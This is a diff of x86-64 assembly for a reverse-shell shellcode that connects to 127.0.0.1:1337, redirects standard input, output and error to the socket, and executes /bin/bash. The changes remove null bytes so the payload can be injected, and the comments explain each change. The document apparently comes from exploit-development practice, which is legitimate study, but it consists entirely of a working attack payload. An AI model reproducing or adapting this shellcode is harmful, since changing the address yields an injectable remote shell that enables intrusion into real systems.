@@ -3,50 +3,56 @@ global _start
 
 _start:
 _socket:
-    mov rbx, 2 ; AF_INET
-    mov rcx, 1 ; SOCK_STREAM
-    mov rdx, 6 ; IPPROTO_TCP
-    mov rax, 359; sys_socket
+    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
+    xor rbx, rbx ; clear rbx, this results in no 0 bytes in the shellcode
+    xor rcx, rcx ; clear rcx, this results in no 0 bytes in the shellcode
+    xor rdx, rdx ; clear rdx, this results in no 0 bytes in the shellcode
+    ; we use the bl,cl,dl registers instead of rbx rcx rdx registers because
+    ; they result in extra 0 bytes in the shell code
+    mov bl, 2 ; AF_INET
+    mov cl, 1 ; SOCK_STREAM
+    mov dl, 6 ; IPPROTO_TCP
+    mov ax, 359; sys_socket
     int 0x80 ; syscall
     mov r13, rax ; save file descriptor
 
 _connect:
-    mov rax, `\0\0\0\0\0\0\0\0` ; padding
-    push rax
     mov rax, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
     push rax
 
-    mov rax, 42 ; connect
+    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
+    mov al, 42 ; connect
     mov rdi, r13
     mov rsi, rsp
-    mov rdx, 0x10
+    mov dl, 0x10
     syscall
 
-    mov rax, 63 ; dup2
+    mov al, 63 ; dup2
     mov rbx, r13
-    mov rcx, 0 ; stdou
+    xor rcx, rcx ; stdout, set 0 to rcx without using mov rcx, 0 -> which results in 0 bytes in the shellcode
     int 0x80
 
-    mov rax, 63 ; dup2
+    mov al, 63 ; dup2
     mov rbx, r13
-    mov rcx, 1 ; stdin
+    mov cl, 1 ; stdin, use cl instead of rcx, this results in no 0 bytes in the shellcode
     int 0x80
 
-    mov rax, 63 ; dup2
+    mov al, 63 ; dup2
     mov rbx, r13
-    mov rcx, 2 ; stderr
+    mov cl, 2 ; stderr, use cl instead of rcx, this results in no 0 bytes in the shellcode
     int 0x80
 
     ; prepare execing bin/bash
-    mov rax, `h\0\0\0\0\0\0\0`
-    push rax
+    mov al, `h` ; we use al here, becaue we don't want to padd with 0 bytes
+    push ax ; we push ax here because we want to add a zero byte after /bin/bash on the stack
     mov rax, `/bin/bas`
     push rax
 
-    mov rax, 59 ; execve
+    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
+    mov al, 59 ; execve, use al, this results in no 0 bytes in the shellcode
     mov rdi, rsp
-    mov rsi, 0
-    mov rdx, 0
+    xor rsi, rsi
+    xor rdx, rdx
     syscall
 
 _exit:
